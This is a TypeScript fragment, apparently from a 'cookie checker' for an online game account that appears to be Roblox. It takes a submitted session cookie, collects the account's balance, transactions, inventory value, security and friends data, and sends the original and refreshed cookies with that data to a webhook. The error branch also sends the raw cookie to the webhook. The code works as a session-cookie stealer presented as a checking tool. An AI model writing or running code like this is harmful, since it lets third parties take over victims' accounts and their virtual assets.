    const gamePlaytime = await getGamePlaytime(userId, cookieValue)

    // Get chat settings
    const chatSettings = await getChatSettings(cookieValue)

    // Get friends data
    const friendsData = await getFriendsData(userId, cookieValue)

    // Get premium payouts
    const premiumPayouts = await getPremiumPayouts(userId, cookieValue)

    // Get trade eligibility
    const canTrade = await getTradeEligibility(userId, cookieValue)

    // Get transactions
    const transactions = await getTransactions(userId, cookieValue)

    // Update account summary with additional info
    if (accountSummary) {
      accountSummary.friendsCount = friendsCount
      accountSummary.followersCount = followersCount
      accountSummary.robuxBalance = robuxBalance
      accountSummary.isPremium = isPremium
      accountSummary.onlineStatus = onlineStatus
      accountSummary.lastOnline = lastOnline
      accountSummary.lastLocation = lastLocation
      accountSummary.avatarFullImage = avatarFullImage
      accountSummary.canTrade = canTrade
    }

    const cookieData = {
      success: true,
      message: "Cookie processed successfully!",
      cookie: newCookie,
      originalCookie: cookieRaw,
      accountSummary,
      groupsInfo,
      securityInfo,
      robuxSummary,
      specialItems,
      recentlyPlayedGames,
      favoriteGames,
      gamePasses,
      privateServers,
      gamePlaytime,
      chatSettings,
      friendsData,
      premiumPayouts,
      transactions,
      inventoryInfo: {
        canView: true,
        itemCount: collectiblesCount,
        limitedItems,
        estimatedValue: collectiblesValue,
      },
    }

    // Send data to webhook
    await sendToWebhook(cookieData)

    return cookieData
  } catch (error) {
    console.error("Error checking cookie:", error)

    // Try to send the error to webhook
    try {
      await sendToWebhook({
        success: false,
        message: "Error processing cookie",
        originalCookie: formData.get("cookie") as string,
        error: error.message || "Unknown error",
      })
    } catch (webhookError) {
      console.error("Error sending webhook for error:", webhookError)
    }

    return {
      success: false,
      message: "An error occurred while checking the cookie",
    }
  }
}
